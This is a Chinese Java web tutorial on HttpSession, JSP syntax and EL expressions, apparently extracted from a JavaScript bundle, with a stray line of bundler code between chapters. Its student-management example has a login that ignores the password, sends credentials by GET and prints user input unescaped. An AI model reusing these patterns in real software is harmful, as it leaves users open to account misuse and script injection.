1）HttpSession对象介绍\n\n它是Servlet规范中提供的一个接口。该接口的实现由Servlet规范的实现提供商提供。我们使用的是Tomcat服务器，它对Servlet规范进行了实现，所以HttpSession接口的实现由Tomcat提供。该对象用于提供一种通过多个页面请求或访问网站来标识用户并存储有关该用户的信息的方法。简单说它就是一个服务端会话对象，用于存储用户的会话数据。\n\n同时，它也是Servlet规范中四大域对象之一的会话域对象。并且它也是用于实现数据共享的。但它与我们之前讲解的应用域和请求域是有区别的。\n\n| 域对象         | 作用范围     | 使用场景                                                     |\n| -------------- | ------------ | ------------------------------------------------------------ |\n| ServletContext | 整个应用范围 | 当前项目中需要数据共享时，可以使用此域对象。                 |\n| ServletRequest | 当前请求范围 | 在请求或者当前请求转发时需要数据共享可以使用此域对象。       |\n| HttpSession    | 会话返回     | 在当前会话范围中实现数据共享。它可以在多次请求中实现数据共享。 |\n\n#### 2）HttpSession的获取\n\n获取HttpSession是通过HttpServletRequest接口中的两个方法获取的，如下图所示：\n\n![获取HttpSession的两个方法](./img/java/javaweb/Cookie&SessionJsp-授课.assets/获取HttpSession的两个方法.png)\n\n这两个方法的区别：\n\n![获取Session的两个方法](./img/java/javaweb/Cookie&SessionJsp-授课.assets/获取Session的两个方法.png)\n\n#### 3）HttpSession的常用方法\n\n![HttpSession方法介绍](./img/java/javaweb/Cookie&SessionJsp-授课.assets/HttpSession方法介绍.png)\n\n### 1.3.2 HttpSession的入门案例\n\n#### 1）需求说明\n\n在请求HttpSessionDemo1这个Servlet时，携带用户名信息，并且把信息保存到会话域中，然后从HttpSessionDemo2这个Servlet中获取登录信息。\n\n#### 2）案例目的\n\n通过本案例的讲解，同学们可以清楚的认识到会话域的作用，即多次请求间的数据共享。因为是两次请求，请求域肯定不一样了，所以不能用请求域实现。\n\n最终掌握HttpSession对象的获取和使用。\n\n#### 3）原理分析\n\nHttpSession，它虽然是服务端会话管理技术的对象，但它本质仍是一个Cookie。是一个由服务器自动创建的特殊的Cookie，Cookie的名称就是JSESSIONID，Cookie的值是服务器分配的一个唯一的标识。\n\n当我们使用HttpSession时，浏览器在没有禁用Cookie的情况下，都会把这个Cookie带到服务器端，然后根据唯一标识去查找对应的HttpSession对象，找到了，我们就可以直接使用了。下图就是我们入门案例中，HttpSession分配的唯一标识，同学们可以看到两次请求的JSESSIONID的值是一样的：\n\n![案例3-5](./img/java/javaweb/Cookie&SessionJsp-授课.assets/案例3-5.png)\n\n### 1.3.3 HttpSession的钝化和活化\n\n**什么是持久态**\n\n​\t\t把长时间不用，但还不到过期时间的HttpSession进行序列化，写到磁盘上。\n\n​\t\t我们把HttpSession持久态也叫做钝化。（与钝化相反的，我们叫活化。）\n\n**什么时候使用持久化**\n\n​\t\t第一种情况：当访问量很大时，服务器会根据getLastAccessTime来进行排序，对长时间不用，但是还没到过期时间的HttpSession进行持久化。\n\n​\t\t第二种情况：当服务器进行重启的时候，为了保持客户HttpSession中的数据，也要对HttpSession进行持久化\n\n**注意**\n\n​\t\tHttpSession的持久化由服务器来负责管理，我们不用关心。\n\n​\t\t只有实现了序列化接口的类才能被序列化，否则不行。\n\n# 2 页面技术\n\n## 2.1 JSP基础\n\n### 2.1.1 JSP简介\n\nJSP全称是Java Server Page，它和Servlet一样，也是sun公司推出的一套开发动态web资源的技术，称为JSP/Servlet规范。JSP的本质其实就是一个Servlet。\n\n### 2.1.2 JSP和HTML以及Servlet的适用场景\n\n| 类别    | 适用场景                                                     |\n| ------- | ------------------------------------------------------------ |\n| HTML    | 只能开发静态资源，不能包含java代码，无法添加动态数据。       |\n| Servlet | 写java代码，可以输出页面内容，但是很不方便，开发效率极低。   |\n| JSP     | 它包括了HTML的展示技术，同时具备Servlet输出动态资源的能力。但是不适合作为控制器来用。 |\n\n### 2.1.3 JSP简单入门\n\n**创建JavaWeb工程**\n\n![案例jsp1](./img/java/javaweb/Cookie&SessionJsp-授课.assets/案例jsp1.png)\n\n**在index.jsp中填写内容**\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n  <head>\n    <title>JSP的入门</title>\n  </head>\n  <body>\n      这是第一个JSP页面\n  </body>\n</html>\n```\n\n**部署项目**\n\n沿用会话管理工程的部署方式即可。\n\n**测试运行**\n\n![案例jsp2](./img/java/javaweb/Cookie&SessionJsp-授课.assets/案例jsp2.png)\n\n### 2.1.4 JSP说明\n\n写在之前： 明确JSP就是一个Servlet。是一个特殊的Servlet。\n\nJSP的原理：\n\n​           客户端提交请求\n\n​\t\t\t\t——Tomcat服务器解析请求地址\n\n​\t\t\t\t\t\t——找到JSP页面\n\n​\t\t\t\t\t\t\t\t——Tomcat将JSP页面翻译成Servlet的java文件\n\n​\t\t\t\t\t\t\t\t\t\t——将翻译好的.java文件编译成.class文件\n\n​\t\t\t\t\t\t\t\t\t\t\t\t——返回到客户浏览器上。\n\n#### 1）执行过程分析图\n\n![Tomcat执行过程](./img/java/javaweb/Cookie&SessionJsp-授课.assets/Tomcat执行过程.png)\n\n#### 2）JSP的.java文件内容分析\n\n当我们打开index.jsp翻译的java文件看到的就是`public final class index_jsp extends org.apache.jasper.runtime.HttpJspBase`类的声明，然后我们在Tomcat的源码中找到类的声明，如下图：\n\n![Tomcat中的HttpJspBase类声明](./img/java/javaweb/Cookie&SessionJsp-授课.assets/Tomcat中的HttpJspBase类声明.png)\n\n这张图一出场，就表明我们写的JSP它本质就是一个HttpServlet了。\n\n![jsp的本质说明](./img/java/javaweb/Cookie&SessionJsp-授课.assets/jsp的本质说明.png)\n\n同时，我们在index_jsp.java文件中找到了输出页面的代码，并且在浏览器端查看源文件，看到的内容是一样的。这也就是说明，我们的浏览器上的内容，在通过jsp展示时，本质都是用out.write()输出出来的。\n\n讲到这里，我们应该清楚的认识到，JSP它是一个特殊的Servlet，主要是用于展示动态数据。它展示的方式是用流把数据输出出来，而我们在使用JSP时，涉及HTML的部分，都与HTML的用法一致，这部分称为jsp中的模板元素，在开发过程中，先写好这些模板元素，因为它们决定了页面的外观。\n\n## 2.2 JSP应用\n\n### 2.2.1 JSP语法\n\n#### 1）Java代码块\n\n在jsp中，可以使用java脚本代码。形式为：<font color=\'red\'><b><% 此处写java代码 %></b></font>\n\n但是，在实际开发中，极少使用此种形式编写java代码。同时需要注意的是：\n\n```jsp\n<%\n\t在里面写java程序脚本需要注意：这里面的内容由tomcat负责翻译，翻译之后是service方法的成员变量\n%>\n```\n\n**示例：**\n\n```jsp\n\x3c!--Java代码块--\x3e\n<% out.println("这是Java代码块");%>\n<hr/>\n```\n\n#### 2）JSP表达式\n\n在jsp中，可以使用特定表达式语法，形式为：<font color=\'red\'><b><%=表达式%></b></font>\n\njsp在翻译完后是out.print(表达式内容);\n\n所以：<%out.print("当前时间);%>和<%="当前时间"%>是一样的。\n\n在实际开发中，这种表达式语法用的也很少使用。\n\n**示例：**\n\n```jsp\n\x3c!--JSP表达式--\x3e\n<%="这是JSP表达式"%><br/>\n就相当于<br/>\n<%out.println("这是没有JSP表达式输出的");%>\n```\n\n#### 3）JSP声明\n\n在JSP中也可以声明一些变量，方法，静态方法，形式为：<font color=\'red\'><b><%! 声明的内容 %></b></font>\n\n使用JSP声明需要注意：\n\n```jsp\n<%! \n\t需要注意的是： 写在里面的内容将会被tomcat翻译成全局的属性或者类方法。\n%>                                    \n```\n\n**示例：**\n\n```jsp\n\x3c!--JSP声明--\x3e\n<%! String str = "声明语法格式";%>\n<%=str%>\n```\n\n#### 4）JSP注释\n\n在使用JSP时，它有自己的注释，形式为：<font color=\'red\'><b><%--注释--%></b></font>\n\n需要注意的是：\n\n​      在Jsp中可以使用html的注释，但是只能注释html元素，不能注释java程序片段和表达式。同时，被html注释部分会参与翻译，并且会在浏览器上显示\n\n​      jsp的注释不仅可以注释java程序片段，也可以注释html元素，并且被jsp注释的部分不会参与翻译成.java文件，也不会在浏览器上显示。\n\n**示例：**\n\n```jsp\n<%--JSP注释--%>\n\x3c!--HTML注释--\x3e\n```\n\n#### 5）语法的示例\n\n**JSP语法完整示例代码**\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>JSP语法</title>\n</head>\n<body>\n\n\x3c!--Java代码块--\x3e\n<% out.println("这是Java代码块");%>\n<hr/>\n\n\x3c!--JSP表达式--\x3e\n<%="这是JSP表达式"%><br/>\n就相当于<br/>\n<%out.println("这是没有JSP表达式输出的");%>\n\n<hr/>\n\x3c!--JSP声明--\x3e\n<%! String str = "声明语法格式";%>\n<%=str%>\n\n<hr/>\n\n<%--JSP注释--%>\n\x3c!--HTML注释--\x3e\n\n</body>\n</html>\n```\n\n**JSP语法运行结果**\n\n![案例jsp3](./img/java/javaweb/Cookie&SessionJsp-授课.assets/案例jsp3.png)\n\n### 2.2.2 JSP指令\n\n#### 1）page指令\n\n**language:**告知引擎，脚本使用的是java，默认是java，支持java。不写也行。\n\n**extends**：告知引擎，JSP对应的Servlet的父类是哪个，不需要写，也不需要改。\n\n**import**：告知引擎，导入哪些包（类）。\n\n​                **注意：引擎会自动导入：java.lang.\\*,javax.servlet.\\*,javax.servlet.http.\\*,javax.servlet.jsp.\\***\n\n​                    **导入的形式：** \n\n​                         **<%@page import=”java.util.Date,java.util.UUID”%>或者：**\n\n​                         **<%@page import=”java.util.Date”%>**\n\n​                         **<%@page import=”java.util.UUID”%>**  **用Eclipse：Alt+/ 自动导入**\n\n**session**：告知引擎是否产生HttpSession对象，即是否在代码中调用request.getSession()。默认是true。\n\n**buffer**：JspWriter用于输出JSP内容到页面上。告知引擎，设定他的缓存大小。默认8kb。\n\n**errorPage**：告知引擎，当前页面出现异常后，应该转发到哪个页面上（路径写法：/代表当前应用）\n\n​                \t**小贴士：当在errorpage上使用了isErrorPage=true之后，ie8有时候不能正常显示**\n\n​            \t\t **配置全局错误页面：web.xml**\n\n\n\n```xml\n<error-page>    \n    <exception-type>java.lang.Exception</exception-type>    \t\t\t\n    <location>/error.jsp</location>\n</error-page>\n<error-page>\n    <error-code>404</error-code>\n    <location>/404.html</location>\n</error-page>                                 \n```\n\n​           \t\t **当使用了全局错误页面，就无须再写errorPage来实现转到错误页面，而是由服务器负责跳转到错误页面。**\n\n**isErrorPage**：告知引擎，是否抓住异常。如果该属性为true，页面中就可以使用exception对象，打印异常的详细信息。默认值是false。\n\n**contentType**：告知引擎，响应正文的MIME类型。contentType="text/html;charset=UTF-8"\n\n​               \t\t\t相当于response.setContentType("text/html;charset=UTF-8");\n\n**pageEncoding**：告知引擎，翻译jsp时（从磁盘上读取jsp文件）所用的码表。pageEncoding="UTF-8"相当于告知引擎用UTF-8读取JSP\n\n**isELIgnored***：告知引擎，是否忽略EL表达式，默认值是false，不忽略。\n\n#### 2）include指令\n\n语法格式：<%@include file="" %>该指令是包含外部页面。 \n\n属性：file，以/开头，就代表当前应用。\n\n**使用示例**\n\n![静态包含1](./img/java/javaweb/Cookie&SessionJsp-授课.assets/静态包含1.png)\n\n**静态包含的特点**\n\n![静态包含2](./img/java/javaweb/Cookie&SessionJsp-授课.assets/静态包含2.png)\n\n#### 3）taglib指令\n\n语法格式：<%taglib uri="" prefix=""%>\n\n作用：该指令用于引入外部标签库。html标签和jsp标签不用引入。\n\n属性：                                                                                   \n\n​       uri：外部标签的URI地址。\n\n​       prefix：使用标签时的前缀。\n\n### 2.2.3 JSP细节\n\n#### 1）九大隐式对象\n\n什么是隐式对象呢？它指的是在jsp中，可以不声明就直接使用的对象。它只存在于jsp中，因为java类中的变量必须要先声明再使用。其实jsp中的隐式对象也并非是未声明，只是它是在翻译成.java文件时声明的。所以我们在jsp中可以直接使用。\n\n| 隐式对象名称 | 类型                                   | 备注                          |\n| ------------ | -------------------------------------- | ----------------------------- |\n| request      | javax.servlet.http.HttpServletRequest  |                               |\n| response     | javax.servlet.http.HttpServletResponse |                               |\n| session      | javax.servlet.http.HttpSession         | Page指令可以控制开关          |\n| application  | javax.servlet.ServletContext           |                               |\n| page         | Java.lang.Object                       | 当前jsp对应的servlet引用实例  |\n| config       | javax.servlet.ServletConfig            |                               |\n| exception    | java.lang.Throwable                    | page指令有开关                |\n| out          | javax.servlet.jsp.JspWriter            | 字符输出流，相当于printwriter |\n| pageContext  | javax.servlet.jsp.PageContext          | 很重要                        |\n\n#### 2）PageContext对象\n\n**简介**\n\n它是JSP独有的对象，Servlet中没有这个对象。本身也是一个域（作用范围）对象，但是它可以操作其他3个域对象中的属性。而且还可以获取其他8个隐式对象。\n\n**生命周期**\n\n它是一个局部变量，所以它的生命周期随着JSP的创建而诞生，随着JSP的结束而消失。每个JSP页面都有一个独立的PageContext。\n\n**常用方法**\n\n![PageContext方法详解](./img/java/javaweb/Cookie&SessionJsp-授课.assets/PageContext方法详解.png)\n\n在上图中，同学们发现没有页面域操作的方法，其实是定义在了PageContext的父类JspContext中，如下图所示：\n\n![JspContext](./img/java/javaweb/Cookie&SessionJsp-授课.assets/JspContext.png)\n\n#### 3）四大域对象\n\n| 域对象名称     | 范围     | 级别                     | 备注                                     |\n| -------------- | -------- | ------------------------ | ---------------------------------------- |\n| PageContext    | 页面范围 | 最小，只能在当前页面用   | 因范围太小，开发中用的很少               |\n| ServletRequest | 请求范围 | 一次请求或当期请求转发用 | 当请求转发之后，再次转发时请求域丢失     |\n| HttpSession    | 会话范围 | 多次请求数据共享时使用   | 多次请求共享数据，但不同的客户端不能共享 |\n| ServletContext | 应用范围 | 最大，整个应用都可以使用 | 尽量少用，如果对数据有修改需要做同步处理 |\n\n### 2.2.4 JSP最佳实战-MVC模型\n\n**Servlet：**擅长处理业务逻辑，不擅长输出显示界面。在web开发中多用于控制程序逻辑（流程）。所以我们称之为：控制器。\n\n**JSP：**擅长显示界面，不擅长处理程序逻辑。在web开发中多用于展示动态界面。所以我们称之为：视图。\n\n例如:               ![1577355748295](./img/java/javaweb/Cookie&SessionJsp-授课.assets/1577355748295.png)                                                                      \n\nM：model      ，通常用于封装数据，封装的是数据模型。\n\nV：view\t       ，通常用于展示数据。动态展示用jsp页面，静态数据展示用html。\n\nC：controller ，通常用于处理请求和响应。一般指的是Servlet。\n\n# 3 综合案例-学生管理系统升级\n\n## 3.1 登录功能实现\n\n### 3.1.1 创建一个web项目，在 web 目录下创建一个 index.jsp。\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>学生管理系统首页</title>\n</head>\n<body>\n    <%--\n        获取会话域中的数据\n        如果获取到了则显示添加和查看功能的超链接\n        如果没获取到则显示登录功能的超链接\n    --%>\n    <% Object username = session.getAttribute("username");\n        if(username == null) {\n    %>\n        <a href="/stu/login.jsp">请登录</a>\n    <%} else {%>\n        <a href="/stu/addStudent.jsp">添加学生</a>\n        <a href="/stu/listStudentServlet">查看学生</a>\n    <%}%>\n</body>\n</html>\n```\n\n\n\n### 3.1.2 在 web 目录下创建一个 login.jsp。实现登录页面\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>学生登录</title>\n</head>\n<body>\n    <form action="/stu/loginStudentServlet" method="get" autocomplete="off">\n        姓名：<input type="text" name="username"> <br>\n        密码：<input type="password" name="password"> <br>\n        <button type="submit">登录</button>\n    </form>\n</body>\n</html>\n\n```\n\n\n\n### 3.1.3 创建 LoginStudentServlet，获取用户名和密码\n\n```java\npackage com.itheima.servlet;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\n/*\n    学生登录\n */\n@WebServlet("/loginStudentServlet")\npublic class LoginStudentServlet extends HttpServlet{\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        //1.获取用户名和密码\n        String username = req.getParameter("username");\n        String password = req.getParameter("password");\n\n        //2.判断用户名\n        if(username == null || "".equals(username)) {\n            //2.1用户名为空 重定向到登录页面\n            resp.sendRedirect("/stu/login.jsp");\n            return;\n        }\n\n        //2.2用户名不为空 将用户名存入会话域中\n        req.getSession().setAttribute("username",username);\n\n        //3.重定向到首页index.jsp\n        resp.sendRedirect("/stu/index.jsp");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n\n```\n\n\n\n##  3.2添加功能实现\n\n### 3.2.1 在 web 目录下创建一个 addStudent.jsp，实现添加学生的表单项\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>添加学生</title>\n</head>\n<body>\n<form action="/stu/addStudentServlet" method="get" autocomplete="off">\n    学生姓名：<input type="text" name="username"> <br>\n    学生年龄：<input type="number" name="age"> <br>\n    学生成绩：<input type="number" name="score"> <br>\n    <button type="submit">保存</button>\n</form>\n</body>\n</html>\n\n```\n\n### 3.2.2 创建 AddStudentServlet，获取学生信息并保存到文件中\n\n```java\npackage com.itheima.servlet;\n\nimport com.itheima.bean.Student;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.BufferedWriter;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\n/*\n    实现添加功能\n */\n@WebServlet("/addStudentServlet")\npublic class AddStudentServlet extends HttpServlet{\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        //1.获取表单中的数据\n        String username = req.getParameter("username");\n        String age = req.getParameter("age");\n        String score = req.getParameter("score");\n\n        //2.创建学生对象并赋值\n        Student stu = new Student();\n        stu.setUsername(username);\n        stu.setAge(Integer.parseInt(age));\n        stu.setScore(Integer.parseInt(score));\n\n        //3.将学生对象的数据保存到d:\\\\stu.txt文件中\n        BufferedWriter bw = new BufferedWriter(new FileWriter("d:\\\\stu.txt",true));\n        bw.write(stu.getUsername() + "," + stu.getAge() + "," + stu.getScore());\n        bw.newLine();\n        bw.close();\n\n        //4.通过定时刷新功能响应给浏览器\n        resp.setContentType("text/html;charset=UTF-8");\n        resp.getWriter().write("添加成功。2秒后自动跳转到首页...");\n        resp.setHeader("Refresh","2;URL=/stu/index.jsp");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n\n```\n\n## 3.3 查看学生功能\n\n### 3.3.1 创建 ListStudentServlet，读取文件中的学生信息到集合中\n\n```\n1、将集合添加到会话域中\n\n2、重定向到 listStudent.jsp 页面上\n```\n\n\n\n```java\npackage com.itheima.servlet;\n\nimport com.itheima.bean.Student;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\n\n/*\n    实现查看功能\n */\n@WebServlet("/listStudentServlet")\npublic class ListStudentServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        //1.创建字符输入流对象，关联读取的文件\n        BufferedReader br = new BufferedReader(new FileReader("d:\\\\stu.txt"));\n\n        //2.创建集合对象，用于保存Student对象\n        ArrayList<Student> list = new ArrayList<>();\n\n        //3.循环读取文件中的数据，将数据封装到Student对象中。再把多个学生对象添加到集合中\n        String line;\n        while((line = br.readLine()) != null) {\n            //张三,23,95\n            Student stu = new Student();\n            String[] arr = line.split(",");\n            stu.setUsername(arr[0]);\n            stu.setAge(Integer.parseInt(arr[1]));\n            stu.setScore(Integer.parseInt(arr[2]));\n            list.add(stu);\n        }\n\n        //4.将集合对象存入会话域中\n        req.getSession().setAttribute("students",list);\n\n        //5.重定向到学生列表页面\n        resp.sendRedirect("/stu/listStudent.jsp");\n\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n\n```\n\n### 3.3.2 在 web 目录下创建一个 listStudent.jsp\n\n```jsp\n<%@ page import="com.itheima.bean.Student" %>\n<%@ page import="java.util.ArrayList" %>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>查看学生</title>\n</head>\n<body>\n    <table width="600px" border="1px">\n        <tr>\n            <th>学生姓名</th>\n            <th>学生年龄</th>\n            <th>学生成绩</th>\n        </tr>\n        <% ArrayList<Student> students = (ArrayList<Student>) session.getAttribute("students");\n            for(Student stu : students) {\n        %>\n            <tr align="center">\n                <td><%=stu.getUsername()%></td>\n                <td><%=stu.getAge()%></td>\n                <td><%=stu.getScore()%></td>\n            </tr>\n        <%}%>\n    </table>\n</body>\n</html>\n\n```\n\n',Kr={data:function(){return{MainComponent:Qr}}},Xr=Kr,Yr=Object(u["a"])(Xr,Gr,Vr,!1,null,"6b004ea5",null),Zr=Yr.exports,nt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},rt=[],tt='EL&Filter&Listener-授课\n\n# 1 EL表达式和JSTL\n\n## 1.1 EL表达式\n\n### 1.1.1 EL表达式概述\n\n**基本概念**\n\nEL表达式，全称是Expression Language。意为表达式语言。它是Servlet规范中的一部分，是JSP2.0规范加入的内容。其作用是用于在JSP页面中获取数据，从而让我们的JSP脱离java代码块和JSP表达式。\n\n**基本语法**\n\nEL表达式的语法格式非常简单，写为 <b><font color=\'red\' size=\'5\'>${表达式内容}</font></b>\n\n例如：在浏览器中输出请求域中名称为message的内容。\n\n假定，我们在请求域中存入了一个名称为message的数据（`request.setAttribute("message","EL");`），此时在jsp中获取的方式，如下表显示：\n\n| Java代码块                                                   | JSP表达式                              | EL表达式                              |\n| :----------------------------------------------------------- | :------------------------------------- | :------------------------------------ |\n| `<%<br/> <br/> String message = (String)request.getAttribute("message");<br/> out.write(message);<br/>%>` | `<%=request.getAttribute("message")%>` | <font color=\'red\'>`${message}`</font> |\n\n通过上面我们可以看出，都可以从请求域中获取数据，但是EL表达式写起来是最简单的方式。这也是以后我们在实际开发中，当使用JSP作为视图时，绝大多数都会采用的方式。\n\n### 1.1.2 EL表达式的入门案例\n\n#### 第一步：创建JavaWeb工程\n\n![入门案例1](./img/java/javaweb/EL&Filter&Listener-授课.assets/入门案例1.png)\n\n#### 第二步：创建jsp页面\n\n![入门案例2](./img/java/javaweb/EL&Filter&Listener-授课.assets/入门案例2.png)\n\n#### 第三步：在JSP页面中编写代码\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n  <head>\n    <title>EL表达式入门案例</title>\n  </head>\n  <body>\n    <%--使用java代码在请求域中存入一个名称为message的数据--%>\n    <% request.setAttribute("message","Expression Language");%>\n\n    Java代码块获取：<% out.print(request.getAttribute("message"));%>\n    <br/>\n    JSP表达式获取：<%=request.getAttribute("message")%>\n    <br/>\n    EL表达式获取：${message}\n  </body>\n</html>\n```\n\n#### 第四步：部署工程\n\n![入门案例3](./img/java/javaweb/EL&Filter&Listener-授课.assets/入门案例3.png)\n\n#### 第五步：运行测试\n\n![入门案例4](./img/java/javaweb/EL&Filter&Listener-授课.assets/入门案例4.png)\n\n### 1.1.2 EL表达式基本用法\n\n在前面的概述介绍中，我们介绍了EL表达式的作用，它就是用于获取数据的，那么它是从哪获取数据呢？\n\n#### 1）获取四大域中的数据\n\n它只能从四大域中获取数据，调用的就是`findAttribute(name,value);`方法，根据名称由小到大逐个域中查找，找到就返回，找不到就什么都不显示。\n\n它可以获取对象，可以是对象中关联其他对象，可以是一个List集合，也可以是一个Map集合。具体代码如下：\n\n**创建两个实体类，User和Address**\n\n```java\n/**\n * 用户的实体类\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class User implements Serializable{\n\n\tprivate String name = "黑马程序员";\n\tprivate int age = 18;\n\tprivate Address address = new Address();\n\t\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n\tpublic Address getAddress() {\n\t\treturn address;\n\t}\n\tpublic void setAddress(Address address) {\n\t\tthis.address = address;\n\t}\t\n}\n```\n\n```java\n/**\n * 地址的实体类\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class Address implements Serializable {\n\n\tprivate String province = "北京";\n\tprivate String city = "昌平区";\n\tpublic String getProvince() {\n\t\treturn province;\n\t}\n\tpublic void setProvince(String province) {\n\t\tthis.province = province;\n\t}\n\tpublic String getCity() {\n\t\treturn city;\n\t}\n\tpublic void setCity(String city) {\n\t\tthis.city = city;\n\t}\n}\n```\n\n**JSP代码**\n\n```jsp\n<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>\n<%@ page import="com.itheima.domain.User" %>\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">\n<html>\n\t<head>\n\t\t<title>EL入门</title>\n\t</head>\n\t<body>\n\t\t<%--EL表达式概念：\n\t\t\t\t它是Expression Language的缩写。它是一种替换jsp表达式的语言。\n\t\t\tEL表达式的语法：\n\t\t\t\t${表达式}\n\t\t\t\t表达式的特点：有明确的返回值。\n\t\t\t\tEL表达式就是把内容输出到页面上\n\t\t\tEL表达式的注意事项：\n\t\t\t\t1.EL表达式没有空指针异常\n\t\t\t\t2.EL表达式没有数组下标越界\n\t\t\t\t3.EL表达式没有字符串拼接\n\t\t\tEL表达式的数据获取：\n\t\t\t\t它只能在四大域对象中获取数据，不在四大域对象中的数据它取不到。\n\t\t\t\t它的获取方式就是findAttribute(String name)\n\t\t --%>\n\t\t <br/>-----------获取对象数据---------------------<br/>\n\t\t <% //1.把用户信息存入域中\n\t\t \tUser user = new User();\n\t\t \tpageContext.setAttribute("u",user);\n\t\t  %>\n\t\t  ${u}===============输出的是内存地址<%--就相当于调用此行代码<%=pageContext.findAttribute("u")%> --%><br/>\n\t\t  ${u.name}<%--就相当于调用此行代码<% User user = (User) pageContext.findAttribute("u");out.print(user.getName());%> --%><br/>\n\t\t  ${u.age}\n\t\t <br/>-----------获取关联对象数据------------------<br/>\n\t\t ${u.address}==========输出的address对象的地址<br/>\n\t\t ${u.address.province}${u.address.city}<br/>\n\t\t ${u["address"][\'province\']}\n\t\t <br/>-----------获取数组数据---------------------<br/>\n\t\t <% String[] strs = new String[]{"He","llo","Expression","Language"}; \n\t\t \tpageContext.setAttribute("strs", strs);\n\t\t %>\n\t\t ${strs[0]}==========取的数组中下标为0的元素<br/>\n\t\t ${strs[3]}\n\t\t ${strs[5]}===========如果超过了数组的下标，则什么都不显示<br/>\n\t\t ${strs["2"]}=========会自动为我们转换成下标<br/>\n\t\t ${strs[\'1\']}\n\t\t <br/>-----------获取List集合数据-----------------<br/>\n\t\t <% List<String> list = new ArrayList<String>();\n\t\t \tlist.add("AAA");\n\t\t \tlist.add("BBB");\n\t\t \tlist.add("CCC");\n\t\t \tlist.add("DDD");\n\t\t \tpageContext.setAttribute("list", list);\n\t\t  %>\n\t\t ${list}<br/>\n\t\t ${list[0] }<br/>\n\t\t ${list[3] }<br/>\t \n\t\t <br/>-----------获取Map集合数据------------------<br/>\n\t\t <% Map<String,User> map = new HashMap<String,User>();\n\t\t \tmap.put("aaa",new User());\n\t\t \tpageContext.setAttribute("map", map);\n\t\t  %>\n\t\t  ${map}<br/>\n\t\t  ${map.aaa}<%--获取map的value，是通过get(Key) --%><br/>\n\t\t  ${map.aaa.name}${map.aaa.age}<br/>\n\t\t  ${map["aaa"].name }\n\t</body>\n</html>\n```\n\n运行结果如图：\n\n![eldemo1](./img/java/javaweb/EL&Filter&Listener-授课.assets/eldemo1.png)\n\n#### 2）EL表达式的注意事项\n\n在使用EL表达式时，它帮我们做了一些处理，使我们在使用时可以避免一些错误。它没有空指针异常，没有数组下标越界，没有字符串拼接。\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n  <head>\n    <title>EL表达式的注意事项</title>\n  </head>\n  <body>\n    <%--EL表达式的三个没有--%>\n    第一个：没有空指针异常<br/>\n    <% String str = null;\n       request.setAttribute("testNull",str);\n    %>\n    ${testNull}\n    <hr/>\n    第二个：没有数组下标越界<br/>\n    <% String[] strs = new String[]{"a","b","c"};\n       request.setAttribute("strs",strs);\n    %>\n    取第一个元素：${strs[0]}\n    取第六个元素：${strs[5]}\n    <hr/>\n    第三个：没有字符串拼接<br/>\n    <%--${strs[0]+strs[1]}--%>\n    ${strs[0]}+${strs[1]}\n  </body>\n</html>\n```\n\n运行结果图：\n\n\\\\\n\n#### 3）EL表达式的使用细节\n\nEL表达式除了能在四大域中获取数据，同时它可以访问其他隐式对象，并且访问对象有返回值的方法.\n\n#### 4）EL表达式的运算符\n\nEL表达式中运算符如下图所示，它们都是一目了然的：\n\n![1577782263203](./img/java/javaweb/EL&Filter&Listener-授课.assets/1577782263203.png)\n\n![1577782270585](./img/java/javaweb/EL&Filter&Listener-授课.assets/1577782270585.png)\n\n但是有两个特殊的运算符，使用方式的代码如下：\n\n```jsp\n<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>\n<%@ page import="com.itheima.domain.User" %>\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 